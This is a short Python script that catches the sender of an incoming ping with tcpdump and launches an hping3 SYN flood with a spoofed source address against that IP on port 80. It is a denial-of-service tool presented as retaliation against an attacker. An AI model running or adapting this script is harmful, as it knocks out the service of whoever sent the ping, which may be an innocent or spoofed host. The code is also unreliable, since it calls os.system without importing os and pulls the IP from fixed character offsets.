import subprocess

#Selection of interface
print('Choose Interface:')
print("1.eth0 2.wlan0")
c=int(input())
if(c==1):
    interface="eth0"
else:
    interface="wlan0"

#Capturing Attackers IP
ip=subprocess.check_output('tcpdump -c 1 -i '+interface+' icmp and icmp[icmptype]=icmp-echo',shell=True)
print("Capture Successful!!!")
ip=str(ip)
ip=ip[21:35]

print("Attackers IP: ",ip)

#Dos Attack Initiated
os.system("hping3 -S "+ip+" -a "+ip+" -p 80 --flood")
